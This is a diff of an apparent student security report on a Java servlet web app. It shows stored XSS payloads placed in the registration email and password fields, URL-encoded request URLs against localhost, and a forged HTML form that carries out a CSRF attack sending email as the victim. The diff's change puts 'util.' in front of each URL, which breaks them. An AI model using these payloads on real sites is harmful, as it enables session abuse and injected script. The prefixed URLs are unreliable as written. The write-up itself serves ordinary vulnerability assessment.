@@ -51,7 +51,7 @@ On registration, pass `<script>console.log("pwned");</script>` as the email to r
 
 This is equivalent to making a POST request to the following URL:
 ```
-http://localhost:8080/exam-project/RegisterServlet?name=Name1&surname=Surname1&email=%3Cscript%3Econsole.log%28%22pwned%22%29%3B%3C%2Fscript%3E&password=123
+util.http://localhost:8080/exam-project/RegisterServlet?name=Name1&surname=Surname1&email=%3Cscript%3Econsole.log%28%22pwned%22%29%3B%3C%2Fscript%3E&password=123
 ```
 This URL can be used for a XSRF attack, like shown below.
 
@@ -66,7 +66,7 @@ On registration, enter a valid email and `"><script>console.log("pwned");</scrip
 
 This is equivalent to making a POST request to the following URL:
 ```
-http://localhost:8080/exam-project/RegisterServlet?name=Name3&surname=Surname3&email=user3%40gmail.com&password=%22%3E%3Cscript%3Econsole.log%28%22pwned%22%29%3B%3C%2Fscript%3E
+util.http://localhost:8080/exam-project/RegisterServlet?name=Name3&surname=Surname3&email=user3%40gmail.com&password=%22%3E%3Cscript%3Econsole.log%28%22pwned%22%29%3B%3C%2Fscript%3E
 ```
 This URL can be used for a XSRF attack, like shown below.
 
@@ -84,7 +84,7 @@ Using a longer string throws an exception on the server and does not return the 
 The following HTML page can be forged, such that the session cookie of the victim visiting the page is used to authenticate the sending of an arbitrary email.
 In this example `user1@gmail.com` is forced to email `user2@gmail.com`.
 ```html
-<form id="submitMail" class="form-resize" action="http://localhost:8080/exam-project/SendMailServlet"
+<form id="submitMail" class="form-resize" action="util.http://localhost:8080/exam-project/SendMailServlet"
       method="post">
     <input type="hidden" name="sender" value="user1@gmail.com">
     <input class="hidden" name="receiver" placeholder="Receiver" required="" value="user2@gmail.com">
